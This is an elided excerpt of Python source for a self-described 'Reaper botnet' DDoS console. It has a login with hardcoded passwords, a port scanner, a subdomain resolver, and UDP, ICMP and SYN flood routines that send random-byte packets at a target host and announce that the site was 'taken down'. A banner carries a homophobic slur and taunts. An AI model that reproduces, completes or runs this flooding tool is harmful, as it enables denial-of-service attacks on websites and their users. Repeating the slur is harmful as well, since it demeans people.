...
sys.stdout.write("\x1b]2;R E A P E R S |SIN| B E S T\x07")
def modifications():
...
info = """
[\033[91mYOUR SHIT GOT HACKED\033[00m] \033[91mget fucked you fat faggots stop ddosing people GET HACKED,reapers
"""
...
╚══════════════════════════════════════════════════════╝\033[00m"""
banner = """\033[1;00m
              welcome to the Reaper botnet
          this is one of the strongest Botnets to surface

              welcome to the future of DDOS <3
...
altbanner = """
			          Angels go to heaven
			           demons go to hell
		      Reapers are what get stuck in the middle
		      		     R E A P E R S
"""
...
def main():
	...
	while True:
		...
		sin = input("\033[1;00m[\033[91mReaper\033[1;00m]-\033[91m死\033[00m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (altbanner)
			...
			def scan(port, ip):
				try:
					...
					print ("[\033[91mReap\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
			...
			print ("\n[\033[91mReaper\033[00m] UPD Running processes: {}".format (uaid))
			print ("[\033[91mReaper\033[00m] ICMP Running processes: {}".format (iaid))
			print ("[\033[91mReaper\033[00m] SYN Running processes: {}".format (said))
			...
			try:
				...
				for link in domains:
					try:
						...
						print ("[\033[91mReaper\033[00m] Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;R E A P E R |{}| F O U N D\x07".format (sfound))
					except socket.error:
						pass
			...
			try:
				...
				while True:
					try:
						...
						sys.stdout.write("\x1b]2;R E A P E R |{}ms| D E M O N S\x07".format (stop))
			...
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Reaper just took down website: {}".format (host))
				punch = random._urandom(int(pack))
			...
			if username == "guests":
				...
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Reapers just ended: {}".format (host))
					punch = random._urandom(int(pack))
...
try:
	...
	exit()
try:
	passwords = ["reaper", "gayman"]
	password = getpass.getpass ("[+] Password (root): ")
	if user == "reaper":
		if password == passwords[0]:
			print ("[+] welcome to the future of DDOS ")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				...
				print ("\n[\033[91mReaper\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect please leave skid")
			exit()
	if user == "guests":
